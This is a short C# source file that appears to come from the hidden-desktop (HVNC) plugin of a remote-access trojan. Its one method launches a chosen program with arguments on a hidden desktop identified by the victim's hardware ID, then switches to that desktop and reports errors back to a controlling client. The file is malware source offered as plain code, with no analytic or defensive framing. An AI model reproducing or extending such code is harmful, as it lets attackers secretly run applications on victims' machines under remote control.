using System;
using System.IO;
using System.Threading;

namespace Plugin.Helper.OpenApp;

internal class CustomOpen
{
	public static void Open(string Filename, string Args)
	{
		try
		{
			if (File.Exists(Filename))
			{
				HideDesktop.CreateProcess(Filename + " " + Args, Plugin.hwid, bAppName: false);
				Thread.Sleep(3000);
				HideDesktop.Load(Plugin.HVNCDesktop);
			}
		}
		catch (Exception ex)
		{
			Client.Error("CustomOpen: " + ex.Message);
		}
	}
}
